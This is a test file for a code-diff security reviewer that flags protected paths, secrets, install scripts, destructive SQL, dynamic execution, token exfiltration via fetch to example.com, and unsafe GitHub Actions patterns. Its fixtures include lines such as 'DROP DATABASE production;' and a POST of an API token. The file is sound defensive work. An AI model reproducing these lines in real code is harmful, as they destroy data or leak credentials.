import { describe, expect, it } from "vitest";
import { fileURLToPath } from "node:url";
import { defaultConfig, loadConfig } from "../src/config.js";
import { authAndSecretsRule } from "../src/rules/auth-and-secrets.js";
import { dependencyChangesRule } from "../src/rules/dependency-changes.js";
import { destructiveOpsRule } from "../src/rules/destructive-ops.js";
import { githubActionsRule } from "../src/rules/github-actions.js";
import { networkAndExecRule } from "../src/rules/network-and-exec.js";
import { sensitiveFilesRule } from "../src/rules/sensitive-files.js";
import type { DiffFile } from "../src/types.js";

function diffFile(path: string, addedLines: string[] = []): DiffFile {
  return {
    path,
    additions: addedLines.length,
    deletions: 0,
    addedLines,
    removedLines: [],
    isDeleted: false,
    isNew: false
  };
}

describe("rule modules", () => {
  it("flags protected paths and GitHub workflow changes separately", () => {
    const findings = sensitiveFilesRule([
      diffFile("src/auth/session.ts"),
      diffFile(".github/workflows/ci.yml")
    ], defaultConfig);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "protected-path-change",
        severity: "medium",
        score: 20,
        files: ["src/auth/session.ts", ".github/workflows/ci.yml"]
      }),
      expect.objectContaining({
        ruleId: "github-workflow-change",
        severity: "high",
        score: 25,
        files: [".github/workflows/ci.yml"]
      })
    ]));
  });

  it("halts when a secret-like value is added and redacts evidence", () => {
    const findings = authAndSecretsRule([
      diffFile("src/config.ts", ["const apiKey = '1234567890abcdef1234567890';"])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "secret-like-string-added",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["src/config.ts"]
      })
    ]);
    expect(findings[0]?.evidence?.[0]).toContain("[redacted]");
  });

  it("halts package lifecycle scripts in dependency manifests", () => {
    const findings = dependencyChangesRule([
      diffFile("package.json", ["  \"postinstall\": \"node scripts/install.js\""])
    ], defaultConfig);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "dependency-manifest-change",
        severity: "medium",
        score: 20,
        files: ["package.json"]
      }),
      expect.objectContaining({
        ruleId: "install-script-added",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["package.json"]
      })
    ]));
  });

  it("halts destructive SQL operations with evidence", () => {
    const findings = destructiveOpsRule([
      diffFile("migrations/20260626_drop_users.sql", ["DROP TABLE users;"])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "drop-table",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["migrations/20260626_drop_users.sql"],
        evidence: ["DROP TABLE users;"]
      })
    ]);
  });

  it("halts destructive database/schema drops", () => {
    const findings = destructiveOpsRule([
      diffFile("migrations/001.sql", ["DROP DATABASE production;"])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({ ruleId: "drop-database", severity: "critical", score: 100, halt: true })
    ]);
  });

  it("halts a schema-qualified broad delete", () => {
    const findings = destructiveOpsRule([
      diffFile("migrations/002.sql", ["DELETE FROM app.users;"])
    ], defaultConfig);

    expect(findings.some((f) => f.ruleId === "broad-delete" && f.halt)).toBe(true);
  });

  it("does not flag a scoped delete with a real WHERE clause", () => {
    const findings = destructiveOpsRule([
      diffFile("migrations/003.sql", ["DELETE FROM users WHERE id = 42;"])
    ], defaultConfig);

    expect(findings.some((f) => f.ruleId === "broad-delete")).toBe(false);
  });

  it("flags os.system and subprocess dynamic execution", () => {
    const system = networkAndExecRule([diffFile("run.py", ["os.system(user_input)"])], defaultConfig);
    expect(system.some((f) => f.ruleId === "dynamic-execution-added")).toBe(true);

    const sub = networkAndExecRule([diffFile("run.py", ["subprocess.Popen(cmd, shell=True)"])], defaultConfig);
    expect(sub.some((f) => f.ruleId === "dynamic-execution-added")).toBe(true);
  });

  it("detects network egress near environment access", () => {
    const findings = networkAndExecRule([
      diffFile("src/export.ts", [
        "const token = process.env.API_TOKEN;",
        "await fetch('https://example.com/collect', { method: 'POST', body: token });"
      ])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "network-egress-with-env-access",
        severity: "critical",
        score: 100,
        halt: true,
        files: ["src/export.ts"]
      })
    ]);
  });

  it("flags untrusted PR title/body used near shell execution in a workflow", () => {
    const findings = githubActionsRule([
      diffFile(".github/workflows/pr-comment.yml", [
        "on: pull_request",
        "        run: |",
        "          echo \"${{ github.event.pull_request.title }}\" >> summary.txt"
      ])
    ], defaultConfig);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "github-actions-untrusted-pr-text-in-shell",
        severity: "high",
        score: 35,
        files: [".github/workflows/pr-comment.yml"]
      })
    ]));
  });

  it("halts pull_request_target workflows that check out untrusted PR head refs", () => {
    const findings = githubActionsRule([
      diffFile(".github/workflows/pr-comment.yml", [
        "on:",
        "  pull_request_target:",
        "      - uses: actions/checkout@v4",
        "        with:",
        "          ref: ${{ github.event.pull_request.head.sha }}"
      ])
    ], defaultConfig);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "github-actions-pull-request-target-untrusted-checkout",
        severity: "critical",
        score: 100,
        halt: true,
        files: [".github/workflows/pr-comment.yml"]
      })
    ]));
  });

  it("halts workflows that expose secrets too broadly", () => {
    const findings = githubActionsRule([
      diffFile(".github/workflows/deploy.yml", ["    secrets: inherit"])
    ], defaultConfig);

    expect(findings).toEqual([
      expect.objectContaining({
        ruleId: "github-actions-broad-secret-exposure",
        severity: "critical",
        score: 100,
        halt: true,
        files: [".github/workflows/deploy.yml"]
      })
    ]);
  });

  it("does not flag a benign workflow change without unsafe patterns", () => {
    const findings = githubActionsRule([
      diffFile(".github/workflows/build.yml", ["      - run: npm run build"])
    ], defaultConfig);

    expect(findings).toHaveLength(0);
  });

  it("matches Node/Express policy pack protected middleware, guards, and workflow/package files", () => {
    const config = loadConfig(fileURLToPath(new URL("../policy-packs/node-express.yml", import.meta.url)));
    const findings = sensitiveFilesRule([
      diffFile("src/middleware/auth.ts"),
      diffFile("src/middleware/session.ts"),
      diffFile("src/middleware/jwt.ts"),
      diffFile("src/routes/admin/guard.ts"),
      diffFile("package.json"),
      diffFile(".github/workflows/ci.yml")
    ], config);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "protected-path-change",
        files: [
          "src/middleware/auth.ts",
          "src/middleware/session.ts",
          "src/middleware/jwt.ts",
          "src/routes/admin/guard.ts",
          "package.json",
          ".github/workflows/ci.yml"
        ]
      }),
      expect.objectContaining({
        ruleId: "github-workflow-change",
        files: [".github/workflows/ci.yml"]
      })
    ]));
  });

  it("matches Terraform policy pack protected infrastructure paths", () => {
    const config = loadConfig(fileURLToPath(new URL("../policy-packs/terraform.yml", import.meta.url)));
    const findings = sensitiveFilesRule([
      diffFile("main.tf"),
      diffFile("terraform/network/vpc.tf"),
      diffFile("modules/storage/variables.tfvars"),
      diffFile(".github/workflows/deploy.yml")
    ], config);

    expect(findings).toEqual(expect.arrayContaining([
      expect.objectContaining({
        ruleId: "protected-path-change",
        files: [
          "main.tf",
          "terraform/network/vpc.tf",
          "modules/storage/variables.tfvars",
          ".github/workflows/deploy.yml"
        ]
      }),
      expect.objectContaining({
        ruleId: "github-workflow-change",
        files: [".github/workflows/deploy.yml"]
      })
    ]));
  });
});
